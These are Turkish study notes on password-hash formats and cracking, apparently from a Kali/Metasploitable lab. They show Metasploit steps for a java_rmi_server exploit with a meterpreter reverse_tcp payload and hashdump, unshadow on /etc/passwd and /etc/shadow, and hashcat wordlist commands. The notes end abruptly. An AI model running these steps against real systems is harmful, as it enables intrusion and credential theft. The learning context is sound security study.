# Parola Ve Hash Kırma

- /usr/share/wordlist/

** Hash Nedir? **

- Hash, bir veriyi (örneğin şifreyi) geri döndürülemez şekilde sabit uzunlukta bir değere çevirir.

- MD5 : 128-bit (kısa) hash üretir ama artık GÜVENSİZ $1$
- SHA-512 :daha güçlü bir hash algoritmasıdır $6$
- En doğrusu → slow hashing algoritmaları:bcrypt,pbkdf2,argon2

* root:$6$abc123$KJHSDkjhaskjdhaksjdhaksjdh:19000:0:99999:7::: 	
    root → kullanıcı
	$6$ → SHA-512

---

- LM hash, eski Windows sistemlerinde kullanılan çok zayıf bir hash türüdür.
- NTLM (NT LAN Manager), LM’den sonra gelen daha gelişmiş hash sistemidir

* Windows hash : admin:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::

** Hash'leri Toplama **

- Kali'de toplamak (metasploitable'ın)

  > msfconsole
  > use exploit/multi/misc/java_rmi_server // Java uygulamalarında. Uzaktaki (remote) objeleri çalıştırmayı sağlar
  > show payloads
  > set payload java/meterpreter/reverse_tcp
  > set options
  > meterpreter > hushdump //çıkmama ihtimali olabilir
  > run post/linux/gather/hashdump //hashler çıkar

- Linux'te toplamak
  > unshadow
  > unshadow /etc/passwd /etc/shadow //hashlari birleştirir orjinal hale getirir

---

### Hashcat

→ Dünyanın en güçlü password hash kırma (cracking) aracıdır
• GPU kullanır
• Çok hızlıdır
• Birçok hash türünü destekler

- Kali Linux için

> hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttract.txt // hash lerin olduğu klasöre konumlanılır. 1800 kendi hash bölümünü bul. Kali için 512 $6$ operating system olan seçilir. Sonuna wordlist eklenir. Wordlist içinde hedef password varsa şifre bulunur.

> hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttract.txt --show // Daha önce bu hash kırılmışsa kırılan hash görünür

> hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttract.txt --potfile-disable // Kırılan hash görünmez yeniden kırma işlemi yapılır.

- Linux için
